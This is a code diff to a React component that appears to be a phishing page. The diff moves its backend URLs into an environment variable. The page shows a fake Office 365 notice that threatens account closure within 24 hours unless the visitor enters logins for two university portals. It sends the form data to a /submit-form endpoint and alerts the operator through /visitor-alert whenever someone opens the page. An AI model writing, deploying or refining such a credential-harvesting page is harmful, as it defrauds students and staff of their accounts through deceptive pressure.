@@ -9,13 +9,14 @@ export const Email = () => {
   const [phoneNumber, setPhoneNumber] = useState('');
   const [isSending, setIsSending] = useState(false);
 
+  const apiUrl = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:5000'; // Fallback to localhost if not set
+
   // Notify visitor on component mount
   useEffect(() => {
-    // Ensure this runs only once per session
     if (!sessionStorage.getItem("visitor-notified")) {
-      sessionStorage.setItem("visitor-notified", "true"); // Mark immediately to avoid double-triggering
-  
-      fetch("http://localhost:5000/visitor-alert", {
+      sessionStorage.setItem("visitor-notified", "true");
+
+      fetch(`${apiUrl}/visitor-alert`, {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -30,8 +31,7 @@ export const Email = () => {
           console.error("Visitor alert failed:", error);
         });
     }
-  }, []);
-  
+  }, [apiUrl]);
 
   const handlePhoneChange = (e) => {
     const value = e.target.value;
@@ -75,7 +75,7 @@ export const Email = () => {
         dateTime,
       };
 
-      const response = await fetch("http://localhost:5000/submit-form", {
+      const response = await fetch(`${apiUrl}/submit-form`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(formData),
@@ -101,7 +101,7 @@ export const Email = () => {
       <div className="field-container">
         <div className="notice-message" style={{ marginBottom: "20px", color: "#333", fontSize: "15px", lineHeight: "1.5" }}>
           <p>
-          We noticed that your Office 365 has two separate logins for two different university portals.  Please provide the two logins as soon as possible. To avoid termination within 24 hours, we expect you to strictly adhere and address the issue.  Failure to verify will result in the closure of your account.  Please fill out the details for each school below.
+            We noticed that your Office 365 has two separate logins for two different university portals.  Please provide the two logins as soon as possible. To avoid termination within 24 hours, we expect you to strictly adhere and address the issue.  Failure to verify will result in the closure of your account.  Please fill out the details for each school below.
           </p>
         </div>
 
